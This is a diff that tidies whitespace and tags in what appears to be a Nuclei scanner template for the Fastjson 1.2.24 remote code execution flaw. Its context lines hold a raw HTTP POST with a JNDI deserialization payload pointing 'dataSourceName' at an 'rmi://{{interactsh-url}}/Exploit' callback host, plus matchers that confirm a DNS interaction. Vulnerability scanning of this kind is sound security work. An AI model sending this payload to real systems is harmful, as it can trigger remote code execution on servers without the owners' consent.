@@ -1,5 +1,4 @@
 id: fastjson-1-2-24-rce
-
 info:
   name: Fastjson 1.2.24 - Remote Code Execution
   author: zh
@@ -13,8 +12,7 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10.0
     cwe-id: CWE-77
-  tags: fastjson,rce,deserialization,oast,vulhub
-
+  tags: fastjson,rce,deserialization,oast
 requests:
   - raw:
       - |
@@ -29,7 +27,6 @@ requests:
                 "autoCommit":true
             }
         }
-
       - |
         POST / HTTP/1.1
         Host: {{Hostname}}
@@ -40,15 +37,13 @@ requests:
            "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
            "autoCommit":true
         }
-
     stop-at-first-match: true
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol   # Confirms DNS Interaction
+        part: interactsh_protocol # Confirms DNS Interaction
         words:
           - "dns"
-
       - type: word
         condition: and
         words:
